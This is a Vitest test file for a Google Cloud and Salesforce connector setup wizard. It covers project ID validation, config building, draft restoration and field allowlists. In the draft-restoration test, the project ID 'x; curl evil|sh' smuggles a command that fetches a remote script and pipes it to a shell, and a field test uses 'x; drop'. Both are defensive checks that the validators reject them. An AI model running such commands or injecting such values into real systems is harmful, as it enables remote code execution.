import { describe, expect, it } from "vitest";
import {
  buildGcpConfig, buildSalesforceConfig, validName, EMPTY_GCP, EMPTY_SALESFORCE, gcloudCommands, probeSalesforceConfig, readGcpDraft, validField,
  validObject, validProject,
} from "./wizard";

describe("assistente de Conector", () => {
  it("o ID de projeto do Google Cloud segue a regra do Conector", () => {
    expect(validProject("acme-integracoes")).toBe(true);
    expect(validProject("Acme")).toBe(false);
    expect(validProject("ab")).toBe(false);
    expect(validProject("acme-")).toBe(false);
  });

  it("a config do Google Cloud só leva o que foi preenchido", () => {
    expect(buildGcpConfig({ ...EMPTY_GCP, project_id: "acme-integracoes" })).toEqual({ project_id: "acme-integracoes", auth: "key", backfill_hours: 24 });
    expect(buildGcpConfig({ ...EMPTY_GCP, project_id: "acme-integracoes", services: " sap-order-sync , ,sf-sync", min_severity: "ERROR", filter: " jsonPayload.x=1 ", backfill_hours: 168 }))
      .toEqual({ project_id: "acme-integracoes", auth: "key", services: ["sap-order-sync", "sf-sync"], min_severity: "ERROR", filter: "jsonPayload.x=1", backfill_hours: 168 });
  });

  it("o rascunho guardado volta só com campos conhecidos e do tipo certo; senão, recomeça", () => {
    const saved = { ...EMPTY_GCP, step: 3, project_id: "acme-integracoes" };
    expect(readGcpDraft(JSON.stringify(saved))).toEqual(saved);
    expect(readGcpDraft(JSON.stringify({ ...saved, step: 9 }))).toEqual(EMPTY_GCP);
    expect(readGcpDraft(JSON.stringify({ ...saved, backfill_hours: 48 }))).toEqual(EMPTY_GCP);
    expect(readGcpDraft(JSON.stringify({ ...saved, project_id: 7 }))).toEqual(EMPTY_GCP);
    expect(readGcpDraft("{")).toEqual(EMPTY_GCP);
    expect(readGcpDraft(null)).toEqual(EMPTY_GCP);
    // Projeto inválido (rascunho mexido na aba) ou intervalo fora das opções: recomeça.
    expect(readGcpDraft(JSON.stringify({ ...saved, project_id: "x; curl evil|sh" }))).toEqual(EMPTY_GCP);
    expect(readGcpDraft(JSON.stringify({ ...saved, sync_interval_seconds: 7 }))).toEqual(EMPTY_GCP);
    // Projeto vazio só no passo 1.
    expect(readGcpDraft(JSON.stringify({ ...EMPTY_GCP, step: 1 }))).toEqual(EMPTY_GCP);
    expect(readGcpDraft(JSON.stringify({ ...EMPTY_GCP, step: 2 }))).toEqual(EMPTY_GCP);
  });

  it("o nome é opcional; preenchido, com 2 a 80 caracteres sem contar os espaços", () => {
    expect(validName("")).toBe(true);
    expect(validName(" a ")).toBe(false);
    expect(validName("Cloud Logging")).toBe(true);
  });

  it("os comandos dão à Service Account só leitura de logs", () => {
    const commands = gcloudCommands("acme-integracoes");
    expect(commands).toHaveLength(3);
    expect(commands[1]).toContain('--role="roles/logging.viewer"');
    expect(commands.join(" ")).toContain("doctor-reader@acme-integracoes.iam.gserviceaccount.com");
  });

  it("Salesforce: objeto __c e campos pela allowlist; nenhum texto de consulta", () => {
    expect(validObject("")).toBe(true);
    expect(validObject("Integration_Log__c")).toBe(true);
    expect(validObject("Account")).toBe(false);
    expect(validField("Message__c")).toBe(true);
    expect(validField("x; drop")).toBe(false);
  });

  it("Salesforce: o teste pede todas as fontes; a config leva só as escolhidas", () => {
    const draft = { ...EMPTY_SALESFORCE, object: "Integration_Log__c", message_field: "Message__c" };
    expect(probeSalesforceConfig(draft).sources).toEqual(["integration_log", "apex_log", "event_log_file"]);
    expect(probeSalesforceConfig({ ...draft, object: "" }).sources).toEqual(["apex_log", "event_log_file"]);
    expect(buildSalesforceConfig({ ...draft, sources: ["integration_log"] })).toEqual({
      environment: "production", auth: "jwt_bearer", sources: ["integration_log"],
      integration_log: { object: "Integration_Log__c", timestamp_field: "CreatedDate", message_field: "Message__c" },
    });
    expect(buildSalesforceConfig({ ...draft, sources: ["apex_log"] })).toEqual({ environment: "production", auth: "jwt_bearer", sources: ["apex_log"] });
  });
});
